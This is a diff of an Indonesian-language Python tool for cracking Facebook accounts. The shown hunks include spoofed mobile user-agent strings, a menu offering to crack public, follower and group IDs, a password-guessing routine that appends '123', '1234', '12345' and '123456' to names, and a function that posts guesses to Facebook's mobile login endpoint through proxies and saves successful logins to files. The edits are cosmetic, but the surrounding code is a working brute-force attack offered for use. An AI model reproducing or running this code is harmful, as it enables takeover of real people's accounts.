@@ -23,7 +23,7 @@ uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001;
 uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
 uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
 uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
-uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
+#uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
 uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
 uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
 uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
@@ -147,15 +147,15 @@ def banner():
 	clear()
 	alvino_xy(f'''\t{asu}
 ┌─────────────────────────────────────────────────────────────┐
-│                                                             │
-│  ███████╗███████╗       ███╗   ███╗██╗   ██╗         │
-│  ██╔════╝██╔════╝       ████╗ ████║╚██╗ ██╔╝         │
+│                                                                        │
+│  ███████╗███████╗       ███╗   ███╗██╗   ██╗                     │
+│  ██╔════╝██╔════╝       ████╗ ████║╚██╗ ██╔╝                     │
 │  ███████╗█████╗   █████╗██╔████╔██║ ╚████╔╝          │
 │  ╚════██║██╔══╝   ╚════╝██║╚██╔╝██║  ╚██╔╝           │
-│  ███████║███████╗       ██║ ╚═╝ ██║   ██║            │
-│  ╚══════╝╚══════╝       ╚═╝     ╚═╝   ╚═╝            │
-│        
- version;0,3  TOOL;2022  Author:KRIBO                    │
+│  ███████║███████╗       ██║ ╚═╝ ██║   ██║             │
+│  ╚══════╝╚══════╝       ╚═╝     ╚═╝   ╚═╝             │
+│  
+  version;0,3  TOOL;2022  Author:KRIBO                        │
 └─────────────────────────────────────────────────────────────┘{x}{m}•{k}•{h}•{x}''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
@@ -211,12 +211,12 @@ def menu(my_name,my_id):
 	alvino_xy(f'[✓] Your Idz : '+str(my_id))
 	alvino_xy(f'[✓] Your Ip  : {ip}')
 	print('')
-	print('[01] Crack Id Publik ')
-	print('[02] Crack Id Follower ')
-	print('[03] Crack Id Grup   ')
-	print('[04] Crack Dari File	')
-	print('[05] Chek Hasil Crack  ')
-	print('[00] Keluar       ')
+	print('[1] Crack Id Publik ')
+	print('[2] Crack Id Follower ')
+	print('[3] Crack Id Grup   ')
+	print('[4] Crack Dari File	')
+	print('[5] Chek Hasil Crack  ')
+	print('[0] Keluar       ')
 	_____alvino__adijaya_____ = input('\n>> Pilih : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
@@ -562,9 +562,9 @@ def crack_file():
 		setting()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	print(f'{x}[01] Akun Lama ')
-	print('[02] Akun Baru ')
-	print('[03] Rombongan ')
+	print(f'{x}[1] Akun Lama ')
+	print('[2] Akun Baru ')
+	print('[3] Rombongan ')
 	print('')
 	hu = input('[f] Pilih : ')
 	if hu in ['1','01']:
@@ -634,7 +634,7 @@ def passwrd():
 					pass
 				else:
 					pwv.append(frs+'123')
-					pwv.append(frs+'786')
+					pwv.append(frs+'123456')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 			else:
@@ -643,7 +643,7 @@ def passwrd():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'786')
+					pwv.append(frs+'123456')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 			if 'ya' in pwpluss:
@@ -696,7 +696,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print('\r%sOK %s               \n└─── Username : %s\n  └── Password : %s%s'%(H,waktu,user,pw,N))
-               # print(f'\r{H}Cookie   : {coki}\n')
+                #print(f'\r{H}Cookie   : {coki}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				os.system("play-audio cp.mp3")
 				akun.append(idf+'|'+pw)
